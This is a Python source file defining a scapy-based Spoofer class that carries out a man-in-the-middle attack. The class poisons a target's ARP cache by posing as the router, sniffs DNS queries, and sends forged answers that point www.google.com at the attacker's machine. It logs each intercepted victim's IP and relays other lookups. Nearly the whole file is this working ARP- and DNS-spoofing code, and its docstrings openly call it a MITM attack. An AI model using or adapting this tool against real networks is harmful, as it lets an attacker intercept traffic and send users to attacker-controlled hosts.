from typing import Dict, Optional, Any, TypedDict
import json
import time
from random import randint

from scapy.all import DNS, IP, sr1, send, sniff, srp, Packet, conf  # type: ignore
from scapy.layers.l2 import ARP, Ether  # type: ignore
from scapy.layers.inet import UDP  # type: ignore
from scapy.layers.dns import DNS, DNSQR, DNSRR  # type: ignore

from data.data_helper import record_entry

class PacketData(TypedDict):
    Time: str
    IP: str

# Configure scapy
conf.noenum.add(conf.route.resync)
conf.use_pcap = True
conf.use_dnet = False  # type: ignore
conf.netcache.resolve = False  # type: ignore

class Spoofer:
    """Class for handling network packet spoofing and manipulation."""

    def __init__(self, host_ip: str, target_ip: str, router_ip: str) -> None:
        """
        Input: host_ip (str) - Host machine IP, target_ip (str) - Target machine IP,
               router_ip (str) - Router IP address
        Output: None
        Purpose: Initialize spoofer with network addresses
        Description: Sets up spoofer with necessary IP addresses and target MAC address
        """
        self.__ip = host_ip
        self.__target_ip = target_ip
        self.__router_ip = router_ip
        self.__target_mac = "1e:00:da:26:fe:10 "
        self.urls: Dict[str, str] = {}

    def checkout(self):
        pass   
    
    def send_spoofed_packet(self) -> None:
        """
        Input: None
        Output: None
        Purpose: Send spoofed ARP packet
        Description: Creates and sends ARP packet pretending to be the router
        """
        packet = ARP(op=2,
                    hwdst=self.__target_mac,
                    pdst=self.__target_ip,
                    psrc=self.__router_ip)
        send(packet, verbose=False)

    def restore_defaults(self, dest: str, source: str) -> None:
        """
        Input: dest (str) - Destination IP, source (str) - Source IP
        Output: None
        Purpose: Restore original ARP mappings
        Description: Sends ARP packets to restore original network configuration
        """
        target_mac = self.get_mac(dest)
        source_mac = self.get_mac(source)
        packet = ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
        send(packet, verbose=False)

    def get_mac(self, ip: str) -> str:
        """
        Input: ip (str) - IP address to lookup
        Output: str - MAC address of the IP
        Purpose: Get MAC address for IP
        Description: Uses ARP to discover MAC address of given IP address
        """
        final_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        answer = srp(final_packet, timeout=2, verbose=False)[0]
        mac = answer[0][1].hwsrc
        return mac

    def process_packet(self, packet: Any) -> None:
        """
        Input: packet (Any) - Network packet to process
        Output: None
        Purpose: Process DNS queries
        Description: Handles DNS queries, providing spoofed responses for specific domains
        """
        if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
            domain = packet[DNSQR].qname.decode().rstrip(".")
            if domain == "www.google.com":
                print(f"Intercepted DNS query for {domain}")

                response_packet = (
                    IP(dst=packet[IP].src, src=packet[IP].dst) /
                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
                    DNS(
                        id=packet[DNS].id,
                        qr=1,
                        aa=1,
                        qd=packet[DNS].qd,
                        an=DNSRR(rrname=domain, type="A", ttl=300, rdata=self.__ip)
                    )
                )

                send(response_packet, verbose=0)
                record_entry(domain, self.build_dict_from_packet(packet))
                print(f"Spoofed DNS response sent: {domain} -> {self.__ip}")
            else:
                response_packet = self.nslookup(domain)
                response_packet[IP].src, response_packet[IP].dst = packet[IP].dst, packet[IP].src
                send(response_packet, verbose=0)  # type: ignore

    def forward_to_router(self) -> None:
        """
        Input: None
        Output: None
        Purpose: Perform MITM attack
        Description: Sniffs and processes network packets during MITM attack
        """
        while True:
            sniff(filter="udp port 53", prn=self.process_packet, promisc=True, store=0, timeout=4)
            self.urls = self.get_urls()

    def build_dict_from_packet(self, packet: Any) -> Dict[str,str]:
        """
        Input: packet (Any) - Network packet to extract data from
        Output: PacketData - Dictionary containing packet information
        Purpose: Extract information from packet
        Description: Creates dictionary with timestamp and source IP from packet
        """
        return {
            "Time": str(time.time()),
            "IP": packet[IP].src
        }

    def get_urls(self) -> Dict[str, str]:
        """
        Input: None
        Output: Dict[str, str] - Dictionary of URL mappings
        Purpose: Load URL mappings
        Description: Loads URL mappings from urls.json file
        """
        try:
            with open('urls.json', "r") as f:
                urls: Dict[str, str] = json.load(f)
        except (json.JSONDecodeError, FileNotFoundError):
            urls = {}
        return urls

    def nslookup(self, domain: str) -> Packet:
        """
        Input: domain (str) - Domain name to lookup
        Output: Packet - DNS response packet
        Purpose: Perform DNS lookup
        Description: Sends DNS query and returns response packet
        """
        dns_query = (
            IP(dst="8.8.8.8") /
            UDP(dport=53, sport=randint(20000, 40000)) /
            DNS(qdcount=1, rd=1, qd=0) /
            DNSQR(qname=domain)
        )
        response_packet = sr1(dns_query, verbose=0)
        return response_packet  # type: ignore
